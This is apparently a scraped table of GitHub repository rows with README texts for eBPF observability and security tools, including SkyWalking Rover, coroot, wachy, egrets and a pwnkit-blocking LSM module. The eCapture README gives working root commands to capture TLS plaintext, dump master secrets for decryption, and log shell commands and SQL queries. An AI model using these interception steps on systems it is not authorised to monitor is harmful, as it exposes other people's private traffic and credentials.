For a complete list of supported destinations, see [here](#supported-destinations).

![Works with any observability tool](./docs/images/ui_choose_dest.png)

### ðŸŽ›ï¸ Collectors Management

Odigos automatically scales OpenTelemetry collectors based on observability data volume.
Manage and configure collectors via a convenient web UI.

![Collectors Management](./docs/images/ui_overview.png)

## Installation

Installing Odigos takes less than 5 minutes and requires no code changes.<br />
Download our [CLI](https://docs.odigos.io/installation) and run the following command:

```bash
odigos install
```

For more information, see our [quickstart guide](https://docs.odigos.io/quickstart/introduction).

## Contributing

Please refer to the [CONTRIBUTING.md](CONTRIBUTING.md) file for information about how to get involved. We welcome issues, questions, and pull requests.

## Thanks to our Contributors

<a href=""https://github.com/odigos-io/odigos/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=keyval-dev/odigos"" />
</a>

## License

This project is licensed under the terms of the Apache 2.0 open-source license. Please refer to [LICENSE](LICENSE) for the full terms.
"
apache/skywalking-rover,228,48,228,1,Go,"Monitor and profiler powered by eBPF to monitor network traffic, and diagnose CPU and network performance.",2022-02-18T01:34:32Z,2025-10-11T10:10:37Z,176,"Apache SkyWalking Rover
==========

<img src=""http://skywalking.apache.org/assets/logo.svg"" alt=""Sky Walking logo"" height=""90px"" align=""right"" />

**SkyWalking Rover**: Monitor and profiler powered by eBPF to monitor network traffic, and diagnose CPU and network performance.

- CPU On/Off profiling for C, C++, Golang, and Rust.
- Network profiling for TCP, TCP(TLS), HTTP(s) traffic with topology and metrics.
- Tracing enhancement. Collect extra information from OS level as attached events for the existing tracing system, such as attach raw data of HTTP request and reponse.
- Kubernetes network monitoring for generating network access logs. 

[![GitHub stars](https://img.shields.io/github/stars/apache/skywalking.svg?style=for-the-badge&label=Stars&logo=github)](https://github.com/apache/skywalking)
[![Twitter Follow](https://img.shields.io/twitter/follow/asfskywalking.svg?style=for-the-badge&label=Follow&logo=twitter)](https://twitter.com/AsfSkyWalking)

# Documentation
- [Official documentation](https://skywalking.apache.org/docs/#SkyWalkingRover)

# Download

Follow the [releases page](https://skywalking.apache.org/downloads/#SkyWalkingRover) or [docker image](https://hub.docker.com/r/apache/skywalking-rover) to download a release of Apache SkyWalking Rover.

# Contact Us
* Mail list: **dev@skywalking.apache.org**. Mail to `dev-subscribe@skywalking.apache.org`, follow the reply to subscribe the mail list.
* Send `Request to join SkyWalking slack` mail to the mail list(`dev@skywalking.apache.org`), we will invite you in.
* For Chinese speaker, send `[CN] Request to join SkyWalking slack` mail to the mail list(`dev@skywalking.apache.org`), we will invite you in.
* Twitter, [ASFSkyWalking](https://twitter.com/AsfSkyWalking)
* [bilibili Bç«™ è§†é¢‘](https://space.bilibili.com/390683219)

# License
[Apache 2.0 License.](LICENSE)
"
coroot/coroot-node-agent,388,80,388,38,Go,A Prometheus exporter based on eBPF that gathers comprehensive container metrics,2021-09-15T11:46:46Z,2025-10-12T02:12:37Z,454,"# Coroot-node-agent

[![Go Report Card](https://goreportcard.com/badge/github.com/coroot/coroot-node-agent)](https://goreportcard.com/report/github.com/coroot/coroot-node-agent)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)

The agent gathers metrics related to a node and the containers running on it, and it exposes them in the Prometheus format.

It uses eBPF to track container related events such as TCP connects, so the minimum supported Linux kernel version is 5.1.

<img src=""https://coroot.com/static/img/blog/ebpf.svg"" width=""800"" />

## Features

### TCP connection tracing

To provide visibility into the relationships between services, the agent traces containers TCP events, such as *connect()* and *listen()*.

Exported metrics are useful for:
* Obtaining an actual map of inter-service communications. It doesn't require integration of distributed tracing frameworks into your code.
* Detecting connections errors from one service to another.
* Measuring network latency between containers, nodes and availability zones.

Related blog posts:
 * [Building a service map using eBPF](https://coroot.com/blog/building-a-service-map-using-ebpf)
 * [How ping measures network round-trip time accurately using SO_TIMESTAMPING](https://coroot.com/blog/how-to-ping)
 * [The current state of eBPF portability](https://coroot.com/blog/ebpf-portability)
### Log patterns extraction

Log management is usually quite expensive. In most cases, you do not need to analyze each event individually.
It is enough to extract recurring patterns and the number of the related events.

This approach drastically reduces the amount of data required for express log analysis.

The agent discovers container logs and parses them right on the node.

At the moment the following sources are supported:
* Direct logging to files in */var/log/*
* Journald
* Dockerd (JSON file driver)
* Containerd (CRI logs)

To learn more about automated log clustering, check out the blog post ""[Mining metrics from unstructured logs](https://coroot.com/blog/mining-logs-from-unstructured-logs)"".

### Delay accounting

[Delay accounting](https://www.kernel.org/doc/html/latest/accounting/delay-accounting.html) allows engineers to accurately
identify situations where a container is experiencing a lack of CPU time or waiting for I/O.

The agent gathers per-process counters through [Netlink](https://man7.org/linux/man-pages/man7/netlink.7.html) and aggregates them into per-container metrics:
* [container_resources_cpu_delay_seconds_total](https://docs.coroot.com/metrics/node-agent#container_resources_cpu_delay_seconds_total)
* [container_resources_disk_delay_seconds_total](https://docs.coroot.com/metrics/node-agent#container_resources_disk_delay_seconds_total)


<img src=""https://coroot.com/static/img/blog/delay_accounting_aggregation.svg"" width=""800"" />

Related blog posts:
* [Delay accounting: an underrated feature of the Linux kernel](https://coroot.com/blog/linux-delay-accounting)


### Out-of-memory events tracing

The [container_oom_kills_total](https://docs.coroot.com/metrics/node-agent#container_oom_kills_total) metric shows that a container has been terminated by the OOM killer.

### Instance meta information

If a node is a cloud instance, the agent identifies a cloud provider and collects additional information using the related metadata services.

Supported cloud providers: [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html), [GCP](https://cloud.google.com/compute/docs/metadata/overview), [Azure](https://docs.microsoft.com/en-us/azure/virtual-machines/linux/instance-metadata-service?tabs=linux), [Hetzner](https://docs.hetzner.cloud/#server-metadata)

Collected info:
* AccountID
* InstanceID
* Instance/machine type
* Region
* AvailabilityZone
* AvailabilityZoneId (AWS only)
* LifeCycle: on-demand/spot (AWS and GCP only)
* Private & Public IP addresses

Related blog posts:
* [Gathering cloud instance metadata in AWS, GCP and Azure](https://coroot.com/blog/cloud-metadata)

## Installation

Follow the Coroot [documentation](https://docs.coroot.com/)

## Metrics

The collected metrics are described [here](https://docs.coroot.com/metrics/node-agent).

## Coroot

The best way to turn metrics to answers about app issues is to use [Coroot](https://github.com/coroot/coroot) - a zero-instrumentation observability tool for microservice architectures. 

A live demo of Coroot is available at [demo.coroot.com](https://demo.coroot.com)

## Contributing
To start contributing, check out our [Contributing Guide](https://github.com/coroot/coroot-node-agent/blob/main/CONTRIBUTING.md).

## License

Coroot-node-agent is licensed under the [Apache License, Version 2.0](https://github.com/coroot/coroot-node-agent/blob/main/LICENSE).

The BPF code is licensed under the General Public License, Version 2.0.
"
evdenis/lsm_bpf_check_argc0,21,0,21,0,C,LSM BPF module to block pwnkit (CVE-2021-4034) like exploits,2022-01-27T10:26:46Z,2024-11-22T15:25:10Z,17,"![BUILD](https://github.com/evdenis/lsm_bpf_check_argc0/actions/workflows/build.yml/badge.svg)

# Check ARGC0 LSM BPF

Simple LSM BPF program to prevent program executions with argc == 0, e.g. pwnkit (CVE-2021-4034).
It does nothing more than a simple check that all exec\*() system calls are called with argc >= 1.
The check is based on Ariadne Conill's [patch](https://lore.kernel.org/all/20220127000724.15106-1-ariadne@dereferenced.org/).

<p align=""center"">
  <a href=""https://youtu.be/rRBaurE7rUM"">
    <img src=""https://img.youtube.com/vi/rRBaurE7rUM/0.jpg"" alt=""LSM BPF demonstration""/>
  </a>
</p>

## How to build

```
# On Ubuntu
$ sudo apt-get install libc6-dev-i386 libbpf0 libbpf-dev

# On Fedora 35
$ sudo dnf install clang bpftool libbpf-devel glibc-devel.i686 glibc-devel.x86_64

$ make
```

## How to install

Run:
```
$ sudo make DESTDIR=/usr install
# will execute following commands
# sudo cp src/load_check_argc0_lsm /usr/sbin
# sudo cp share/check_argc0_lsm.service /etc/systemd/system/

# After that you can enable the service with
$ sudo systemctl daemon-reload
$ sudo systemctl enable check_argc0_lsm.service
$ sudo systemctl start check_argc0_lsm.service
```

Test:
```
$ strace ./test/trigger
...
execve(""/usr/bin/pkexec"", NULL, NULL)   = -1 EINVAL (Invalid argument)

$ sudo journalctl -u check_argc0_lsm.service
Feb 10 13:27:08 purple systemd[1]: Started LSM BPF protection for argc == 0 execs.
Feb 10 13:27:13 purple load_check_argc0_lsm[89177]: TIME     PID     PROCESS          CALLING
Feb 10 13:27:13 purple load_check_argc0_lsm[89177]: 13:27:13 89194   trigger          /usr/bin/pkexec
```

## How to test

Linux kernel >= 5.8 required for BPF LSM (5.7) and BPF rignbuf (5.8).

```
# The program will start, attach an LSM BPF, and monitor the log
$ sudo ./src/load_check_argc0_lsm
TIME     PID     PROCESS          CALLING
12:59:21 85689   trigger          /usr/bin/pkexec
```

One can use the trigger program to test that everything works:
```
$ strace ./test/trigger
...
execve(""/usr/bin/pkexec"", NULL, NULL)   = -1 EINVAL (Invalid argument)
```
"
rubrikinc/wachy,578,18,578,7,Rust,A UI for eBPF-based performance debugging,2021-12-06T23:11:29Z,2025-09-14T16:03:23Z,102,"# wachy

<img src=""docs/images/logo.png?raw=true"" alt=""Logo"" width=""72"" align=""left"">

<br>

&nbsp; A dynamic tracing profiler for Linux

<br>

Wachy provides a UI for interactive eBPF-based userspace performance debugging.
For an overview, see the website: https://rubrikinc.github.io/wachy/. For
background see the introductory
[blog post](https://www.rubrik.com/blog/technology/22/1/introducing-wachy-a-new-approach-to-performance-debugging).

For more details see the [guide](docs/guide.md).

## Compatibility

Wachy requires:
1. Linux 4.6 or later kernel
2. Traced binary should be in a compiled language, and have debugging symbols

1 is due to availability of certain eBPF features, and 2 is due to the
techniques used by wachy (eBPF uprobes and address to line number mappings from
debugging symbols). Wachy also supports C++ symbol demangling - it has mostly
been tested with C++ binaries. If you'd like demangling support for a new
compiled language, please open an issue (note: despite being compiled, [Go does
not play well with
eBPF](https://medium.com/bumble-tech/bpf-and-go-modern-forms-of-introspection-in-linux-6b9802682223#db17)).
If you have ideas on how to do something similar on other platforms or with
other unsupported languages, I'm interested in hearing it!

Wachy also currently only supports x86-64 binaries. If you are interested in
other architectures, please open an issue.

## Install

Download the latest version from the [Releases
page](https://github.com/rubrikinc/wachy/releases).

Wachy relies on
[bpftrace](https://github.com/iovisor/bpftrace/blob/master/INSTALL.md) and the
following shared libraries to run: libgcc_s, libncursesw. On ubuntu some of
these may be installed by default, but to install them all you can run
```
sudo apt install bpftrace libgcc1 libncursesw5
```

If you see strange characters in the TUI, ensure your `LANG` is set correctly,
e.g. before starting wachy, run
```
export LANG=en_US.UTF-8
```

## Compiling

If you want to build wachy from source, it requires the following development
packages: libiberty, ncurses, cmake. On ubuntu you can install them with
```
sudo apt install libiberty-dev libncurses5-dev libncursesw5-dev cmake
```
You also need [Rust](https://www.rust-lang.org) installed.

Then build with cargo
```
cargo build --release
target/release/wachy --help
```

## Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in the work by you, as defined in the Apache-2.0 license, shall be
dual licensed as per [LICENSE.md](LICENSE.md), without any additional terms or
conditions.

Contributions to this project must be accompanied by a Contributor License
Agreement. We use https://cla-assistant.io to automate this process.
"
ehids/ecapture,14651,1557,14651,13,C,Capturing SSL/TLS plaintext without a CA certificate using eBPF. Supported on Linux/Android kernels for amd64/arm64.,2022-03-13T07:40:48Z,2025-10-12T12:10:10Z,977,"<img src=""./images/ecapture-logo.png"" alt=""eCapture Logo"" width=""300"" height=""300""/>

[ç®€ä½“ä¸­æ–‡](./README_CN.md) | English | [æ—¥æœ¬èªž](./README_JA.md)

[![GitHub stars](https://img.shields.io/github/stars/gojue/ecapture.svg?label=Stars&logo=github)](https://github.com/gojue/ecapture)
[![GitHub forks](https://img.shields.io/github/forks/gojue/ecapture?label=Forks&logo=github)](https://github.com/gojue/ecapture)
[![CI](https://github.com/gojue/ecapture/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/gojue/ecapture/actions/workflows/code-analysis.yml)
[![Github Version](https://img.shields.io/github/v/release/gojue/ecapture?display_name=tag&include_prereleases&sort=semver)](https://github.com/gojue/ecapture/releases)
[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/gojue/ecapture)

### eCapture(æ—è§‚è€…): capture SSL/TLS text content without a CA certificate using eBPF.

> [!IMPORTANT]  
> Supports Linux/Android kernel versions x86_64 4.18 and above, **aarch64 5.5** and above.
> Need ROOT permission.
> Does not support Windows and macOS system.

----

<!-- MarkdownTOC autolink=""true"" -->
- [Introduction](#introduction)
- [Getting started](#getting-started)
  - [Download](#download)
    - [ELF binary file](#elf-binary-file)
    - [Docker image](#docker-image)
  - [Capture openssl text content.](#capture-openssl-text-content)
  - [Modules](#modules)
    - [OpenSSL Module](#openssl-module)
    - [GoTLS Module](#gotls-module)
    - [Other Modules](#bash-module)
  - [Videos](#videos)
- [Contributing](#contributing)
- [Compilation](#compilation)
<!-- /MarkdownTOC -->

# Introduction

* SSL/TLS plaintext capture, support openssl\libressl\boringssl\gnutls\nspr(nss) libraries.
* GoTLS plaintext support go tls library, which refers to encrypted communication in https/tls programs written in the golang language.
* Bash audit, capture bash command for Host Security Audit.
* Zsh audit, capture zsh command for Host Security Audit.
* MySQL query SQL audit, support mysqld 5.6\5.7\8.0, and MariaDB.

![](./images/ecapture-help-v0.8.9.svg)

# Getting started

## Download

### ELF binary file

> [!TIP]
> support Linux/Android x86_64/aarch64.

Download ELF zip file [release](https://github.com/gojue/ecapture/releases) , unzip and use by
command `sudo ecapture --help`.

### Docker image

> [!TIP]
> Linux only.

```shell
# pull docker image
docker pull gojue/ecapture:latest
# run
docker run --rm --privileged=true --net=host -v ${HOST_PATH}:${CONTAINER_PATH} gojue/ecapture ARGS
```

see [Docker Hub](https://hub.docker.com/r/gojue/ecapture) for more information.

## Capture openssl text content.

```shell
sudo ecapture tls
2024-09-15T11:51:31Z INF AppName=""eCapture(æ—è§‚è€…)""
2024-09-15T11:51:31Z INF HomePage=https://ecapture.cc
2024-09-15T11:51:31Z INF Repository=https://github.com/gojue/ecapture
2024-09-15T11:51:31Z INF Author=""CFC4N <cfc4ncs@gmail.com>""
2024-09-15T11:51:31Z INF Description=""Capturing SSL/TLS plaintext without a CA certificate using eBPF. Supported on Linux/Android kernels for amd64/arm64.""
2024-09-15T11:51:31Z INF Version=linux_arm64:0.8.6-20240915-d87ae48:5.15.0-113-generic
2024-09-15T11:51:31Z INF Listen=localhost:28256
2024-09-15T11:51:31Z INF eCapture running logs logger=
2024-09-15T11:51:31Z INF the file handler that receives the captured event eventCollector=
2024-09-15T11:51:31Z INF listen=localhost:28256
2024-09-15T11:51:31Z INF https server starting...You can update the configuration file via the HTTP interface.
2024-09-15T11:51:31Z WRN ========== module starting. ==========
2024-09-15T11:51:31Z INF Kernel Info=5.15.152 Pid=233698
2024-09-15T11:51:31Z INF BTF bytecode mode: CORE. btfMode=0
2024-09-15T11:51:31Z INF master key keylogger has been set. eBPFProgramType=Text keylogger=
2024-09-15T11:51:31Z INF module initialization. isReload=false moduleName=EBPFProbeOPENSSL
2024-09-15T11:51:31Z INF Module.Run()
2024-09-15T11:51:31Z WRN OpenSSL/BoringSSL version not found from shared library file, used default version OpenSSL Version=linux_default_3_0
2024-09-15T11:51:31Z INF Hook masterKey function ElfType=2 Functions=[""SSL_get_wbio"",""SSL_in_before"",""SSL_do_handshake""] binrayPath=/usr/lib/aarch64-linux-gnu/libssl.so.3
2024-09-15T11:51:31Z INF target all process.
2024-09-15T11:51:31Z INF target all users.
2024-09-15T11:51:31Z INF setupManagers eBPFProgramType=Text
2024-09-15T11:51:31Z INF BPF bytecode file is matched. bpfFileName=user/bytecode/openssl_3_0_0_kern_core.o
2024-09-15T11:51:32Z INF perfEventReader created mapSize(MB)=4
2024-09-15T11:51:32Z INF perfEventReader created mapSize(MB)=4
2024-09-15T11:51:32Z INF module started successfully. isReload=false moduleName=EBPFProbeOPENSSL
2024-09-15T11:51:53Z ??? UUID:233851_233851_curl_5_1_172.16.71.1:51837, Name:HTTP2Request, Type:2, Length:304

Frame Type	=>	SETTINGS

Frame Type	=>	WINDOW_UPDATE

Frame Type	=>	HEADERS
header field "":method"" = ""GET""
header field "":path"" = ""/""
header field "":scheme"" = ""https""
header field "":authority"" = ""google.com""
header field ""user-agent"" = ""curl/7.81.0""
header field ""accept"" = ""*/*""

Frame Type	=>	SETTINGS

2024-09-15T11:51:53Z ??? UUID:233851_233851_curl_5_0_172.16.71.1:51837, Name:HTTP2Response, Type:4, Length:1160

Frame Type	=>	SETTINGS

Frame Type	=>	WINDOW_UPDATE

Frame Type	=>	SETTINGS

Frame Type	=>	HEADERS
header field "":status"" = ""301""
header field ""location"" = ""https://www.google.com/""
header field ""content-type"" = ""text/html; charset=UTF-8""
header field ""content-security-policy-report-only"" = ""object-src 'none';base-uri 'self';script-src 'nonce-qvZZ0XreBfeqRnUEV1WoYw' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;report-uri https://csp.withgoogle.com/csp/gws/other-hp""
header field ""date"" = ""Sun, 15 Sep 2024 11:51:52 GMT""
header field ""expires"" = ""Tue, 15 Oct 2024 11:51:52 GMT""
header field ""cache-control"" = ""public, max-age=2592000""
header field ""server"" = ""gws""
header field ""content-length"" = ""220""
header field ""x-xss-protection"" = ""0""
header field ""x-frame-options"" = ""SAMEORIGIN""
header field ""alt-svc"" = ""h3=\"":443\""; ma=2592000,h3-29=\"":443\""; ma=2592000""

Frame Type	=>	PING

Frame Type	=>	DATA
<HTML><HEAD><meta http-equiv=""content-type"" content=""text/html;charset=utf-8"">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF=""https://www.google.com/"">here</A>.
</BODY></HTML>
```

## Modules
The eCapture tool comprises 8 modules that respectively support plaintext capture for TLS/SSL encryption libraries like OpenSSL, GnuTLS, NSPR, BoringSSL, and GoTLS. Additionally, it facilitates software audits for Bash, MySQL, and PostgreSQL applications.
* bash		capture bash command
* zsh		capture zsh command
* gnutls	capture gnutls text content without CA cert for gnutls libraries.
* gotls		Capturing plaintext communication from Golang programs encrypted with TLS/HTTPS.
* mysqld	capture sql queries from mysqld 5.6/5.7/8.0 .
* nss		capture nss/nspr encrypted text content without CA cert for nss/nspr libraries.
* postgres	capture sql queries from postgres 10+.
* tls		use to capture tls/ssl text content without CA cert. (Support openssl 1.0.x/1.1.x/3.0.x or newer).
  You can use `ecapture -h` to view the list of subcommands.

### OpenSSL Module

eCapture search `/etc/ld.so.conf` file default, to search load directories of  `SO` file, and search `openssl` shard
libraries location. or you can use `--libssl`
flag to set shard library path.

If target program is compile statically, you can set program path as `--libssl` flag value directlyã€‚

The OpenSSL module supports three capture modes:

- `pcap`/`pcapng` mode stores captured plaintext data in `pcap-NG` format.
- `keylog`/`key` mode saves the TLS handshake keys to a file.
- `text` mode directly captures plaintext data, either outputting to a specified file or printing to the command line.

#### Pcap Mode

Supported TLS encrypted http `1.0/1.1/2.0` over TCP, and http3 `QUIC` protocol over UDP.
You can specify `-m pcap` or `-m pcapng` and use it in conjunction with `--pcapfile` and `-i` parameters. The default value for `--pcapfile` is `ecapture_openssl.pcapng`.

```shell
sudo ecapture tls -m pcap -i eth0 --pcapfile=ecapture.pcapng tcp port 443
```

This command saves captured plaintext data packets as a pcapng file, which can be viewed using `Wireshark`.

```shell
sudo ecapture tls -m pcap -w ecap.pcapng -i ens160
2024-09-15T06:54:12Z INF AppName=""eCapture(æ—è§‚è€…)""
2024-09-15T06:54:12Z INF HomePage=https://ecapture.cc
2024-09-15T06:54:12Z INF Repository=https://github.com/gojue/ecapture
2024-09-15T06:54:12Z INF Author=""CFC4N <cfc4ncs@gmail.com>""
2024-09-15T06:54:12Z INF Description=""Capturing SSL/TLS plaintext without a CA certificate using eBPF. Supported on Linux/Android kernels for amd64/arm64.""
2024-09-15T06:54:12Z INF Version=linux_arm64:0.8.6-20240915-d87ae48:5.15.0-113-generic
2024-09-15T06:54:12Z INF Listen=localhost:28256
2024-09-15T06:54:12Z INF eCapture running logs logger=
2024-09-15T06:54:12Z INF the file handler that receives the captured event eventCollector=
2024-09-15T06:54:12Z WRN ========== module starting. ==========
2024-09-15T06:54:12Z INF Kernel Info=5.15.152 Pid=230440
2024-09-15T06:54:12Z INF BTF bytecode mode: CORE. btfMode=0
2024-09-15T06:54:12Z INF listen=localhost:28256
2024-09-15T06:54:12Z INF module initialization. isReload=false moduleName=EBPFProbeOPENSSL
2024-09-15T06:54:12Z INF Module.Run()
2024-09-15T06:54:12Z INF https server starting...You can update the configuration file via the HTTP interface.
2024-09-15T06:54:12Z WRN OpenSSL/BoringSSL version not found from shared library file, used default version OpenSSL Version=linux_default_3_0
2024-09-15T06:54:12Z INF HOOK type:Openssl elf ElfType=2 IFindex=2 IFname=ens160 PcapFilter= binrayPath=/usr/lib/aarch64-linux-gnu/libssl.so.3
2024-09-15T06:54:12Z INF Hook masterKey function Functions=[""SSL_get_wbio"",""SSL_in_before"",""SSL_do_handshake""]
2024-09-15T06:54:12Z INF target all process.
2024-09-15T06:54:12Z INF target all users.
2024-09-15T06:54:12Z INF setupManagers eBPFProgramType=PcapNG
2024-09-15T06:54:12Z INF BPF bytecode file is matched. bpfFileName=user/bytecode/openssl_3_0_0_kern_core.o
2024-09-15T06:54:12Z INF packets saved into pcapng file. pcapng path=/home/ecapture/ecap.pcapng
2024-09-15T06:54:12Z INF perfEventReader created mapSize(MB)=4
2024-09-15T06:54:12Z INF perfEventReader created mapSize(MB)=4
2024-09-15T06:54:12Z INF module started successfully. isReload=false moduleName=EBPFProbeOPENSSL
2024-09-15T06:54:14Z INF packets saved into pcapng file. count=4
2024-09-15T06:54:16Z INF non-TLSv1.3 cipher suite found CLientRandom=f08e8d784962d1693c042f9fe266345507ccfaba58b823904a357f30dbfa1e71 CipherId=0
2024-09-15T06:54:16Z INF non-TLSv1.3 cipher suite found CLientRandom=f08e8d784962d1693c042f9fe266345507ccfaba58b823904a357f30dbfa1e71 CipherId=0
2024-09-15T06:54:16Z INF packets saved into pcapng file. count=183
2024-09-15T06:54:16Z INF CLIENT_RANDOM save success CLientRandom=f08e8d784962d1693c042f9fe266345507ccfaba58b823904a357f30dbfa1e71 TlsVersion=TLS1_2_VERSION bytes=176
2024-09-15T06:54:18Z INF packets saved into pcapng file. count=65
^C2024-09-15T06:54:18Z INF module close.
2024-09-15T06:54:18Z INF packets saved into pcapng file. count=3
2024-09-15T06:54:18Z INF packets saved into pcapng file. count=255
2024-09-15T06:54:18Z INF Module closed,message recived from Context
2024-09-15T06:54:18Z INF iModule module close
2024-09-15T06:54:18Z INF bye bye.
```

Used `Wireshark` to open `ecap.pcapng` file to view the plaintext data packets.

#### Keylog Mode

You can specify `-m keylog` or `-m key` and use it in conjunction with the `--keylogfile` parameter, which defaults to `ecapture_masterkey.log`.

The captured OpenSSL TLS `Master Secret` information is saved to `--keylogfile`. You can also enable `tcpdump` packet capture and then use `Wireshark` to open the file and set the `Master Secret` path to view plaintext data packets.

```shell
sudo ecapture tls -m keylog -keylogfile=openssl_keylog.log
```

You can also directly use the `tshark` software for real-time decryption and display:

```shell
tshark -o tls.keylog_file:ecapture_masterkey.log -Y http -T fields -e http.file_data -f ""port 443"" -i eth0
```

#### Text Mode

`sudo ecapture tls -m text` will output all plaintext data packets. (Starting from v0.7.0, it no longer captures
SSLKEYLOG information.)

### GoTLS Module

Similar to the OpenSSL module.

#### gotls command

capture tls text context.

Step 1:
```shell
sudo ecapture gotls --elfpath=/home/cfc4n/go_https_client --hex
```

Step 2:
```shell
/home/cfc4n/go_https_client
```

#### more help
```shell
sudo ecapture gotls -h
```

### Other Modules

such as `bash\mysqld\postgres` modules, you can use `ecapture -h` to view the list of subcommands.

## Videos

* Youtube video: [How to use eCapture v0.1.0](https://www.youtube.com/watch?v=CoDIjEQCvvA ""eCapture User Manual"")
* [eCapture:supports capturing plaintext of Golang TLS/HTTPS traffic](https://medium.com/@cfc4ncs/ecapture-supports-capturing-plaintext-of-golang-tls-https-traffic-f16874048269)


## eCaptureQ GUI Application

[eCaptureQ](https://github.com/gojue/ecaptureq) is a cross-platform graphical user interface client for eCapture,
visualizing eBPF TLS capture
capabilities. Built using the Rust + Tauri + React technology stack, it provides a real-time, responsive interface,
enabling easy analysis of encrypted traffic without the need for CA certificates. It simplifies complex eBPF capture
techniques, making them easy to use. Supports two modes:

* Integrated Mode: Unified Linux/Android execution
* Remote Mode: Windows/macOS/Linux client connects to a remote eCapture service

### Video Demonstration

https://github.com/user-attachments/assets/c8b7a84d-58eb-4fdb-9843-f775c97bdbfb

ðŸ”— [GitHub Repository](https://github.com/gojue/ecaptureq)

## Stargazers over time
[![Stargazers over time](https://starchart.cc/gojue/ecapture.svg)](https://starchart.cc/gojue/ecapture)

# Contributing
See [CONTRIBUTING](./CONTRIBUTING.md) for details on submitting patches and the contribution workflow.

# Compilation

See [COMPILATION](./COMPILATION.md) for details on compiling the eCapture source code.

## Acknowledgements

This project is supported by a [JetBrains IDE](https://www.jetbrains.com) license. We thank JetBrains for their
contributions to the open-source community.

![JetBrains logo](https://resources.jetbrains.com/storage/products/company/brand/logos/jetbrains.svg)
"
ancat/egrets,46,3,46,0,Go,egrets monitors egress,2020-01-19T03:56:26Z,2025-05-09T00:19:23Z,16,"# egrets
Egrets is a proof of concept tool that uses eBPF, raw sockets, and kprobes to monitor egress traffic. Raw sockets are used to sniff for DNS queries and responses which are used to build a mapping of IP addresses to hostnames. Kprobes are used to watch syscalls that make network connections. Traditionally, these syscalls would at the most only have IP address information, but because we also have a mapping of hostnames to IP addresses, we can get a better understanding of what hosts processes are connecting to. This is much more reliable than say, whitelisting massive lists of IP addresses or relying on PTR records (which no one uses anyway.)

Egrets is compatible with Docker and will tag TCP connections with container metadata.

There is currently support for printing out events only. A future version will include support for killing processes and taking coredumps (see [Meatball](https://github.com/ancat/meatball)) I'm still learning go and ebpf, so there's still a lot of basic improvements that could be made. There are also some concurrency/synchronization issues so if you leave this program running long enough, it'll eventually crash.  Use this at your own risk! :~)

## Getting Started

There are a few prerequisites. First, you need to be running a ""relatively"" recent kernel; this was tested on 4.15+ kernels. You will also need to ensure that `debugfs` is mounted; `debug -t debugfs none /sys/kernel/debug` if it's not. And finally, you (maybe unsurprisingly) will need root.

```
# grab a copy of this repo
$ git clone https://github.com/ancat/egrets.git
$ cd egrets

# build
$ apt-get install libpcap0.8-dev
$ make

# run
sudo ./egrets
```

## Examples

In the examples below each type of event has its own tag. `dns.query` and `dns.answer` are DNS queries and responses respectively; `process.tcp_v4` are the network connections that tie together syscall + DNS information.

Running `curl facebook.com`:
```
INFO[0001] process.tcp_v4 comm=curl pid=2074 connection=67.207.67.3:53 dns.entry= container.image=none container.hostname=none container.ip=none
INFO[0001] dns.query hostname=facebook.com type=A
INFO[0001] dns.answer hostname=facebook.com response=31.13.71.36
INFO[0001] dns.query hostname=facebook.com type=AAAA
INFO[0001] dns.answer hostname=facebook.com response=2a03:2880:f112:83:face:b00c:0:25de
INFO[0001] process.tcp_v4 comm=curl pid=2074 connection=31.13.71.36:80 dns.entry=facebook.com container.image=none container.hostname=none container.ip=none
INFO[0001] process.tcp_v4 comm=curl pid=2073 connection=31.13.71.36:80 dns.entry=facebook.com container.image=none container.hostname=none container.ip=none
```

Running `apt update` from within a container:
```
INFO[0001] process.tcp_v4 comm=http pid=2735 connection=67.207.67.3:53 dns.entry= container.image=gremlinweb container.hostname=0b1c6a890623 container.ip=172.17.0.2
INFO[0001] dns.query hostname=security.debian.org type=A
INFO[0001] dns.answer hostname=security.debian.org response=149.20.4.14
INFO[0001] dns.answer hostname=security.debian.org response=128.61.240.73
INFO[0001] dns.answer hostname=security.debian.org response=128.31.0.63
INFO[0001] dns.answer hostname=security.debian.org response=128.101.240.215
INFO[0001] process.tcp_v4 comm=http pid=2735 connection=149.20.4.14:80 dns.entry=security.debian.org container.image=gremlinweb container.hostname=0b1c6a890623 container.ip=172.17.0.2
INFO[0001] process.tcp_v4 comm=http pid=2735 connection=128.61.240.73:80 dns.entry=security.debian.org container.image=gremlinweb container.hostname=0b1c6a890623 container.ip=172.17.0.2
INFO[0001] process.tcp_v4 comm=http pid=2735 connection=128.31.0.63:80 dns.entry=security.debian.org container.image=gremlinweb container.hostname=0b1c6a890623 container.ip=172.17.0.2
INFO[0001] process.tcp_v4 comm=http pid=2735 connection=128.101.240.215:80 dns.entry=security.debian.org container.image=gremlinweb container.hostname=0b1c6a890623 container.ip=172.17.0.2
INFO[0001] process.tcp_v4 comm=http pid=2735 connection=149.20.4.14:80 dns.entry=security.debian.org container.image=gremlinweb container.hostname=0b1c6a890623 container.ip=172.17.0.2
INFO[0001] dns.query hostname=deb.debian.org type=A
INFO[0001] process.tcp_v4 comm=http pid=2736 connection=67.207.67.3:53 dns.entry= container.image=gremlinweb container.hostname=0b1c6a890623 container.ip=172.17.0.2
INFO[0001] dns.answer hostname=deb.debian.org response=debian.map.fastly.net
INFO[0001] dns.answer hostname=deb.debian.org response=199.232.38.133
INFO[0001] process.tcp_v4 comm=http pid=2736 connection=199.232.38.133:80 dns.entry=deb.debian.org container.image=gremlinweb container.hostname=0b1c6a890623 container.ip=172.17.0.2
```
"
microsoft/ebpf-for-windows,3318,267,3318,274,C,eBPF implementation that runs on top of Windows,2021-04-08T00:32:50Z,2025-10-11T10:35:41Z,2335,"<img src=""docs/eBPF%20logo%20png%20800px.png"" width=75 height=75 align=left />

# eBPF for Windows

[![CI/CD](https://github.com/microsoft/ebpf-for-windows/actions/workflows/cicd.yml/badge.svg?branch=main&event=schedule)](https://github.com/microsoft/ebpf-for-windows/actions/workflows/cicd.yml?query=event%3Aschedule++)
